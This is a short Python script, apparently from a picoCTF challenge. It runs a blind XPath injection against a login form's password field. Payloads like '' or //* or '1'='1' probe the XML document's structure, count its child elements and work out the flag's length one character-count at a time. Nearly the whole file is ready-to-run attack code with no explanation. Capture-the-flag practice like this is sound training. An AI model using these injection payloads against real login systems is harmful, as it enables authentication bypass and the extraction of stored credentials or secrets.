import requests

base = 'http://wily-courier.picoctf.net:49463'

def try_pass(p):
    r = requests.post(base, data={'name': 'admin', 'pass': p})
    # Success = 'success' alert class, Failure = 'danger' alert
    return 'alert-success' in r.text or 'right path' in r.text

# Test: can we access child elements?
tests = [
    ("' or //* or '1'='1", "any element"),
    ("' or /* or '1'='1", "root element"),
    ("' or /root or '1'='1", "root named root"),
    ("' or /users or '1'='1", "users node"),
    ("' or /flag or '1'='1", "flag node"),
    ("' or //user or '1'='1", "user element"),
    ("' or //password or '1'='1", "password element"),
    ("' or //data or '1'='1", "data element"),
    ("' or name(/*)='root' or '1'='1", "root element name root"),
    ("' or name(/*)='users' or '1'='1", "root name users"),
    ("' or name(/*)='data' or '1'='1", "root name data"),
    ("' or name(/*)='xml' or '1'='1", "root name xml"),
    ("' or name(/*)='flag' or '1'='1", "root name flag"),
]

for p, desc in tests:
    result = try_pass(p)
    print(f'{desc}: {result}')

print()

# Count child elements
for i in range(1, 10):
    p = f"' or count(/*/*)={i} or '1'='1"
    print(f'count(/*/*) = {i}: {try_pass(p)}')
    
print()
# Check string length of flag
for i in range(1, 100):
    p = f"' or string-length(//flag)={i} or '1'='1"
    if try_pass(p):
        print(f'flag length = {i}')
        break